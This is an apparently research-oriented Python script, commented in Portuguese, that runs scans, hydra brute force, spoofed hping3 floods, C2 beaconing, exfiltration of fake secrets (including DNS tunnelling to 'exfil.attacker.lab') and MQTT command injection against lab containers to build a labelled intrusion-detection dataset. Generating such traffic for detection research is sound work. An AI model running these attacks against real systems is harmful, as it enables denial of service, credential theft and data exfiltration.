"""
attacker.py
-----------
Orquestrador híbrido de ataques para geração de dataset NIDS.

Arquitetura:
  - Ferramentas reais (nmap, hydra, hping3, nikto, gobuster) via subprocess
    → tráfego realista e citável em papers
  - Python puro para ataques que ferramentas não cobrem bem:
    C2 beaconing com jitter, IoT protocols (MQTT/CoAP), DNS exfiltration
  - label_logger registra timestamps precisos para rotular o pcap depois

Uso:
    python attacker.py list
    python attacker.py port_scan
    python attacker.py all          # roda tudo em sequência com pausa entre ataques
    python attacker.py all --delay 5
"""

import socket
import time
import random
import sys
import subprocess
import json
import hashlib
import os
import argparse
import struct
from label_logger import LabelLogger

# ── Configuração ────────────────────────────────────────────────────────────────

TARGETS      = ["172.30.0.11", "172.30.0.12", "172.30.0.13"]
C2_HOST      = "172.30.0.100"
C2_PORT      = 8080
TIMEOUT      = 0.5
IFACE        = os.environ.get("ATTACKER_IFACE", "eth0")  # interface de rede do container
WORDLIST_PW  = "/wordlists/passwords.txt"
WORDLIST_URL = "/wordlists/paths.txt"

log = LabelLogger()


# ── Helpers ─────────────────────────────────────────────────────────────────────

def _tcp(host, port, data=None, timeout=TIMEOUT):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((host, port))
            if data:
                s.send(data if isinstance(data, bytes) else data.encode())
            try:
                return s.recv(1024)
            except:
                return b""
    except:
        return None


def _udp(host, port, data):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.sendto(data if isinstance(data, bytes) else data.encode(), (host, port))
    except:
        pass


def _jitter(base, pct=0.3):
    """Intervalo base ± pct% — simula comportamento humano/botnet real."""
    return base * (1 + random.uniform(-pct, pct))


def _run(cmd: list, timeout: int = 60) -> str:
    """Executa ferramenta externa e retorna stdout. Nunca levanta exceção."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.stdout + result.stderr
    except subprocess.TimeoutExpired:
        return "[TIMEOUT]"
    except FileNotFoundError:
        return f"[FERRAMENTA NÃO ENCONTRADA: {cmd[0]}]"
    except Exception as e:
        return f"[ERRO: {e}]"


# ── RECON ───────────────────────────────────────────────────────────────────────

def port_scan():
    """
    nmap -sS (SYN scan) com timing T3 — padrão citável em papers.
    Gera exatamente os pacotes SYN/RST que um NIDS deve detectar.
    Requer NET_RAW (já configurado no docker-compose).
    """
    print("[RECON] port_scan  →  nmap -sS")
    ports = "21,22,23,25,53,80,443,445,8080,8443,2323,3306,5432,6379,27017,9200,1883,5683"
    for target in TARGETS:
        with log.attack("port_scan", tool="nmap", target=target, scan_type="SYN"):
            out = _run([
                "nmap", "-sS", "-T3", "-p", ports,
                "--open", "-n",          # sem DNS lookup
                "--reason",              # motivo de cada estado
                target
            ], timeout=120)
            print(out[:500])            # print truncado para não poluir o terminal


def os_fingerprint():
    """
    nmap -O — fingerprint de SO via análise de stack TCP/IP.
    Gera probes específicos (TTL, window size, TCP options) que são features
    importantes para modelos de detecção.
    """
    print("[RECON] os_fingerprint  →  nmap -O")
    for target in TARGETS:
        with log.attack("os_fingerprint", tool="nmap", target=target):
            out = _run([
                "nmap", "-O", "--osscan-guess",
                "-p", "22,80,443",
                "-n", target
            ], timeout=60)
            print(out[:300])


def service_enum():
    """
    nmap -sV — detecção de versão de serviço com banner grabbing.
    Gera tráfego de probe por serviço (SSH, HTTP, FTP...) com payloads reais.
    """
    print("[RECON] service_enum  →  nmap -sV")
    for target in TARGETS:
        with log.attack("service_enum", tool="nmap", target=target):
            out = _run([
                "nmap", "-sV", "--version-intensity", "5",
                "-p", "21,22,23,80,443,8080",
                "-n", target
            ], timeout=90)
            print(out[:300])


def web_dir_enum():
    """
    gobuster dir — enumeração de diretórios HTTP.
    Gera padrão característico de 404-storm com User-Agent de scanner.
    """
    print("[RECON] web_dir_enum  →  gobuster")
    for target in TARGETS:
        with log.attack("web_dir_enum", tool="gobuster", target=target):
            out = _run([
                "gobuster", "dir",
                "-u", f"http://{target}",
                "-w", WORDLIST_URL,
                "-t", "5",              # 5 threads — moderado para captura limpa
                "-q",                   # quiet: só resultados
                "--timeout", "3s",
            ], timeout=60)
            print(out[:300])


def vuln_scan():
    """
    nikto — scanner de vulnerabilidades web.
    Gera tráfego muito característico (User-Agent nikto, paths de exploits clássicos).
    """
    print("[RECON] vuln_scan  →  nikto")
    for target in TARGETS:
        with log.attack("vuln_scan", tool="nikto", target=target):
            out = _run([
                "nikto", "-h", f"http://{target}",
                "-maxtime", "30s",
                "-nointeractive",
            ], timeout=60)
            print(out[:300])


# ── BRUTE FORCE ─────────────────────────────────────────────────────────────────

def ssh_bruteforce():
    """
    hydra SSH — brute force real com handshake SSH completo.
    Diferente do socket puro, gera o padrão exato que Snort/Suricata detectam.
    """
    print("[BRUTEFORCE] ssh  →  hydra")
    for target in TARGETS:
        with log.attack("ssh_bruteforce", tool="hydra", target=target, service="ssh"):
            out = _run([
                "hydra",
                "-L", WORDLIST_PW,      # usuários = mesma lista de senhas (lab)
                "-P", WORDLIST_PW,
                "-t", "4",              # 4 conexões paralelas
                "-W", "2",              # wait 2s entre tentativas
                "-f",                   # para no primeiro sucesso
                f"ssh://{target}",
            ], timeout=120)
            print(out[:300])


def http_bruteforce():
    """
    hydra HTTP-POST — brute force em login web.
    Gera padrão de POST repetidos com credenciais variadas.
    """
    print("[BRUTEFORCE] http  →  hydra")
    for target in TARGETS:
        with log.attack("http_bruteforce", tool="hydra", target=target, service="http"):
            out = _run([
                "hydra",
                "-L", WORDLIST_PW,
                "-P", WORDLIST_PW,
                "-t", "4",
                f"http-post-form://{target}/login:username=^USER^&password=^PASS^:F=Invalid",
            ], timeout=90)
            print(out[:300])


# ── C2 BEACONING (Python puro — ferramentas não cobrem este padrão) ─────────────

def c2_beaconing():
    """
    Simula botnet beacon com jitter exponencial.
    Padrão: check-in periódico com payload JSON codificado em base64,
    similar a RATs reais (Cobalt Strike, njRAT).
    Ferramentas externas não simulam este comportamento — Python é a escolha certa aqui.
    """
    print("[C2] beaconing  →  Python (jitter beacon)")
    bot_id  = hashlib.md5(b"sensor-bot-001").hexdigest()[:8]
    interval = 3.0  # intervalo base em segundos

    with log.attack("c2_beaconing", tool="python", target=C2_HOST, bot_id=bot_id):
        for seq in range(15):
            payload = json.dumps({
                "id":  bot_id,
                "seq": seq,
                "ts":  time.time(),
                "cmd": "CHECKIN",
                "os":  "Linux",
            })
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(TIMEOUT)
                    s.connect((C2_HOST, C2_PORT))
                    s.send(payload.encode())
                    # Tenta receber comando do C2
                    try:
                        resp = s.recv(512)
                        if resp:
                            print(f"  [C2] cmd recebido: {resp[:80]}")
                    except:
                        pass
            except:
                pass

            # Jitter: beacon real não tem intervalo fixo
            sleep_time = _jitter(interval, pct=0.4)
            time.sleep(sleep_time)


def c2_data_exfil():
    """
    Simula exfiltração de dados via C2 — envia chunks de dados falsos
    codificados em base64, padrão de RATs que exfiltram arquivos.
    """
    print("[C2] data_exfil  →  Python")
    bot_id = hashlib.md5(b"sensor-bot-001").hexdigest()[:8]
    # Dados falsos simulando arquivo de configuração capturado
    fake_data = b"WIFI_SSID=LabNet;WIFI_PASS=secret123;MQTT_BROKER=172.30.0.100" * 10

    with log.attack("c2_data_exfil", tool="python", target=C2_HOST, bot_id=bot_id, bytes=len(fake_data)):
        chunk_size = 64
        for i in range(0, len(fake_data), chunk_size):
            chunk = fake_data[i:i+chunk_size]
            payload = json.dumps({
                "id":   bot_id,
                "cmd":  "EXFIL",
                "seq":  i // chunk_size,
                "data": __import__("base64").b64encode(chunk).decode(),
            })
            try:
                with socket.socket() as s:
                    s.settimeout(TIMEOUT)
                    s.connect((C2_HOST, C2_PORT))
                    s.send(payload.encode())
            except:
                pass
            time.sleep(_jitter(0.2))


# ── DDoS ────────────────────────────────────────────────────────────────────────

def syn_flood():
    """
    hping3 SYN flood — gera pacotes TCP SYN com raw sockets reais.
    Muito mais realista que Python puro: TTL, window size e checksum corretos.
    Requer NET_RAW cap (configurado no docker-compose).
    """
    print("[DDOS] syn_flood  →  hping3")
    target = random.choice(TARGETS)
    with log.attack("syn_flood", tool="hping3", target=target, type="SYN"):
        _run([
            "hping3",
            "--syn",                    # SYN flood
            "--rand-source",            # IP fonte aleatório (spoofed)
            "-p", "80",                 # porta destino
            "--faster",                 # ~10k pacotes/s
            "-c", "500",                # total de pacotes
            target,
        ], timeout=30)


def udp_flood():
    """
    hping3 UDP flood com porta e tamanho variáveis.
    Gera padrão de UDP amplification/flood realista.
    """
    print("[DDOS] udp_flood  →  hping3")
    target = random.choice(TARGETS)
    with log.attack("udp_flood", tool="hping3", target=target, type="UDP"):
        _run([
            "hping3",
            "--udp",
            "-p", str(random.randint(1024, 65535)),
            "--rand-source",
            "-c", "300",
            "-d", "512",               # payload de 512 bytes
            target,
        ], timeout=30)


def icmp_flood():
    """
    hping3 ICMP flood — simula ping flood / smurf attack.
    """
    print("[DDOS] icmp_flood  →  hping3")
    target = random.choice(TARGETS)
    with log.attack("icmp_flood", tool="hping3", target=target, type="ICMP"):
        _run([
            "hping3",
            "--icmp",
            "-c", "200",
            "-d", "120",
            target,
        ], timeout=20)


# ── IoT / Protocolo específico (Python puro — sem ferramenta equivalente) ────────

def mqtt_abuse():
    """
    Abuso de broker MQTT sem autenticação — subscribe em # (wildcard total)
    e publica mensagens em tópicos arbitrários.
    Padrão comum em ataques a IoT (Mirai variantes).
    """
    print("[IOT] mqtt_abuse  →  Python")
    # Implementação manual do protocolo MQTT 3.1.1 (sem lib externa)
    def _mqtt_connect(sock, client_id="attacker"):
        cid = client_id.encode()
        # CONNECT packet
        var_header = b"\x00\x04MQTT\x04\x02\x00\x3c"  # protocolo, flags, keepalive=60s
        payload    = struct.pack(">H", len(cid)) + cid
        remaining  = len(var_header) + len(payload)
        packet     = b"\x10" + bytes([remaining]) + var_header + payload
        sock.send(packet)
        return sock.recv(4)  # CONNACK

    def _mqtt_subscribe(sock, topic="#", pkt_id=1):
        t = topic.encode()
        payload    = struct.pack(">H", pkt_id) + struct.pack(">H", len(t)) + t + b"\x00"
        remaining  = len(payload)
        packet     = b"\x82" + bytes([remaining]) + payload
        sock.send(packet)

    def _mqtt_publish(sock, topic, message, pkt_id=1):
        t   = topic.encode()
        m   = message.encode() if isinstance(message, str) else message
        # QoS 1
        var = struct.pack(">H", len(t)) + t + struct.pack(">H", pkt_id) + m
        packet = b"\x32" + bytes([len(var)]) + var
        sock.send(packet)

    for target in TARGETS:
        with log.attack("mqtt_abuse", tool="python", target=target, port=1883):
            try:
                with socket.socket() as s:
                    s.settimeout(2)
                    s.connect((target, 1883))
                    connack = _mqtt_connect(s, f"attacker-{random.randint(1000,9999)}")
                    if connack and connack[0] == 0x20:  # CONNACK recebido
                        _mqtt_subscribe(s, "#")         # subscribe em tudo
                        time.sleep(0.5)
                        for i in range(5):
                            _mqtt_publish(s, f"cmd/device/{i}", '{"cmd":"reboot"}')
                            time.sleep(_jitter(0.3))
            except:
                pass


def dns_exfil():
    """
    Exfiltração via DNS — codifica dados em subdomínios de queries DNS.
    Técnica usada por malwares para bypass de firewall (iodine, dnscat2).
    """
    print("[C2] dns_exfil  →  Python (DNS tunneling)")
    fake_secret = b"APIKEY=abc123SECRET=xyz789"
    chunks = [fake_secret[i:i+16] for i in range(0, len(fake_secret), 16)]

    with log.attack("dns_exfil", tool="python", target=C2_HOST, technique="dns_tunneling"):
        for i, chunk in enumerate(chunks):
            encoded = __import__("base64").b32encode(chunk).decode().lower().rstrip("=")
            # Query DNS para <dados>.exfil.attacker.lab
            fqdn = f"{encoded}.seq{i}.exfil.attacker.lab"
            try:
                # DNS query manual via UDP
                txid  = random.randint(0, 65535)
                query = struct.pack(">HHHHHH", txid, 0x0100, 1, 0, 0, 0)
                for label in fqdn.split("."):
                    query += bytes([len(label)]) + label.encode()
                query += b"\x00\x00\x01\x00\x01"  # tipo A, classe IN
                _udp(C2_HOST, 53, query)
            except:
                pass
            time.sleep(_jitter(0.5))


# ── Mapa de ataques ──────────────────────────────────────────────────────────────

ATTACK_MAP = {
    # RECON
    "port_scan":      port_scan,
    "os_fingerprint": os_fingerprint,
    "service_enum":   service_enum,
    "web_dir_enum":   web_dir_enum,
    "vuln_scan":      vuln_scan,
    # BRUTE FORCE
    "ssh_bruteforce": ssh_bruteforce,
    "http_bruteforce":http_bruteforce,
    # C2
    "c2_beaconing":   c2_beaconing,
    "c2_data_exfil":  c2_data_exfil,
    "dns_exfil":      dns_exfil,
    # DDOS
    "syn_flood":      syn_flood,
    "udp_flood":      udp_flood,
    "icmp_flood":     icmp_flood,
    # IoT
    "mqtt_abuse":     mqtt_abuse,
}

# Ordem recomendada para sessão completa de geração de dataset
ALL_SEQUENCE = [
    "port_scan",
    "os_fingerprint",
    "service_enum",
    "web_dir_enum",
    "vuln_scan",
    "ssh_bruteforce",
    "http_bruteforce",
    "c2_beaconing",
    "c2_data_exfil",
    "dns_exfil",
    "syn_flood",
    "udp_flood",
    "icmp_flood",
    "mqtt_abuse",
]


# ── Entry point ──────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Orquestrador de ataques NIDS")
    parser.add_argument("mode", nargs="?", default="list",
                        help="Nome do ataque, 'all', ou 'list'")
    parser.add_argument("--delay", type=float, default=3.0,
                        help="Pausa em segundos entre ataques no modo 'all' (default: 3)")
    args = parser.parse_args()

    if args.mode == "list":
        print("\nAtaques disponíveis:")
        categories = {
            "RECON":       ["port_scan", "os_fingerprint", "service_enum", "web_dir_enum", "vuln_scan"],
            "BRUTE FORCE": ["ssh_bruteforce", "http_bruteforce"],
            "C2":          ["c2_beaconing", "c2_data_exfil", "dns_exfil"],
            "DDoS":        ["syn_flood", "udp_flood", "icmp_flood"],
            "IoT":         ["mqtt_abuse"],
        }
        for cat, attacks in categories.items():
            print(f"\n  [{cat}]")
            for a in attacks:
                tool = "python" if a in ("c2_beaconing","c2_data_exfil","dns_exfil","mqtt_abuse") else "ferramenta"
                print(f"    {a:<20} ({tool})")
        print("\n  Modos especiais: all, list")
        print(f"\n  Labels salvos em: {log.path}")

    elif args.mode == "all":
        print(f"\n[*] Iniciando sessão completa — {len(ALL_SEQUENCE)} ataques")
        print(f"[*] Labels: {log.path}")
        print(f"[*] Delay entre ataques: {args.delay}s\n")
        for name in ALL_SEQUENCE:
            ATTACK_MAP[name]()
            print(f"  → aguardando {args.delay}s antes do próximo ataque...\n")
            time.sleep(args.delay)
        print("[*] Sessão completa. Verifique o label log para rotular o pcap.")

    elif args.mode in ATTACK_MAP:
        ATTACK_MAP[args.mode]()

    else:
        print(f"Ataque inválido: {args.mode}")
        print("Use 'python attacker.py list' para ver opções.")
        sys.exit(1)


if __name__ == "__main__":
    main()
